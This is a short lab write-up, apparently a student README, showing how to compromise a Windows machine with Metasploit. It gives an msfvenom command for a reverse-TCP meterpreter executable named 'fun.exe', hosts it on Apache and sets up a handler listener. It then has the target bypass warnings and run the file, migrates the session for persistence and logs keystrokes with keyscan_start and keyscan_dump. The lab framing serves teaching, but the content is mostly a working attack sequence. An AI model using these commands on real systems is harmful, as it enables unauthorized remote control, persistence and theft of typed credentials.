# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![o1](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/129362e1-a4c9-409b-851a-736ec5d370bc)




Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![o2](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/94d4c038-e93e-44b2-aec5-8f1490252440)





copy the fun.exe into the apache /var/www/html folder
![o3](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/be4073ae-535a-4d73-a9c5-88846050f3b5)



Start apache server
sudo systemctl apache2 start

![o4](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/6c6ab87c-23cd-4487-a957-7d1750ccc852)




Check the status of apache2
![o5](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/99131ed3-efa4-4b8d-bc13-efaa75712f4d)



Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![o6(1)](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/ca0bfd1c-9674-460e-b17a-d7c1ff0ced2c)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![o7](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/089895af-b410-4aa8-819b-7a9cf77244f3)



Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![o8](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/c0c41daf-b7ca-4a01-9ced-d3772d4fb461)



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![o9](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/032c93ad-afd1-49ee-9957-bfa34f23fc1d)



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![o10](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/92bfc75b-c8ee-492f-8913-09473082eb9e)



keyscan_dump	Shows the keystrokes captured so far
![o11](https://github.com/pavankishore-AIDS/Compromising-windows-using-Metasploit/assets/94154941/229c113b-43c2-4e27-b50d-562bc4d031b2)



## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
